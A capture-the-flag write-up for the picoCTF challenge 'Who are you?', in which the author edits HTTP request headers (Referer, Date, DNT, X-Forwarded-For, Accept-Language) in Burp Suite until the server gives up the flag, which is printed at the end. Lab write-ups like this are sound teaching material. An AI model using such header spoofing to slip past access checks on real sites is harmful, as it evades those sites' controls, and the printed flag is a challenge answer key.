# Who are you?

## Problem

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/

Hint: It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

## Solution

first, you have to use pico browser to request the site. This time I'm using burpsuite repeater, here's the request:

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

```

res: I don&#39;t trust users visiting from another site.

now, we have to change the request referer to become the same as the host

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer: mercury.picoctf.net:52362
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

```

res: Sorry, this site only worked in 2018.

We have to add Date in the request

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer: mercury.picoctf.net:52362
Date: Wed, 01 Aug 2018 00:00:00 UTC
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

res: I don&#39;t trust users who can be tracked.

We have add the DNT (user tracking request preference) to 1

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer: mercury.picoctf.net:52362
Date: Wed, 01 Aug 2018 00:00:00 UTC
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

res: This website is only for people from Sweden.

We have to add `X-Forwarded-For` to an ip address located in sweden

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer: mercury.picoctf.net:52362
Date: Wed, 01 Aug 2018 00:00:00 UTC
DNT: 1
X-Forwarded-For: 192.44.242.19
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

res: You&#39;re in Sweden but you don&#39;t speak Swedish?

We have to change the language by changing `Accept-Language` to `sv-sv`

```
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Referer: mercury.picoctf.net:52362
Date: Wed, 01 Aug 2018 00:00:00 UTC
DNT: 1
X-Forwarded-For: 192.44.242.19
Upgrade-Insecure-Requests: 1
User-Agent: picobrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: sv-SV,en;q=0.9
Connection: close


```

FLAG: `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}`